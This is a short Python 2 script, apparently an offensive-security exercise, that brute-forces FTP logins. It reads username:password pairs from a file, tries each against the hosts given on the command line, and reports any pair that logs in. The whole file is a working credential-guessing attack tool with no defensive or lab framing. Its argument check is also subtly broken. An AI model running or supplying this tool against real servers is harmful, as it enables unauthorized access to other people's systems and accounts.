import ftplib, argparse, sys

def bruteLogin(hostname, passwordFile):
	pFile = open(passwordFile, 'r')

	for line in pFile.readlines():
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')

		print "[+] Trying: {0}/{1}".format(userName, passWord)

		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName, passWord)

			print '\n[*] {0} FTP Logon Succeeded: {1}/{2}'.format(str(hostname), userName, passWord)

			ftp.quit()
			return (userName, passWord)

		except Exception, e:
			pass
	print '\n[-] Could not brute force FTP credentials.'
	return (None, None)

def main():
	parser = argparse.ArgumentParser(description="An FTP bruteForcer")
	parser.add_argument('-H', type=str, nargs='+', help="host ip addresses white space separated")
	parser.add_argument('-p', type=str, help="password file")

	args = parser.parse_args()

	Hosts = args.H
	passwordFile = args.p

	if not len(sys.argv) > 1 | (passwordFile == None) | (Hosts == None):
		print parser.print_help()
		exit(0)

	for host in Hosts:
		bruteLogin(host, passwordFile)

if __name__ == "__main__":
	main()
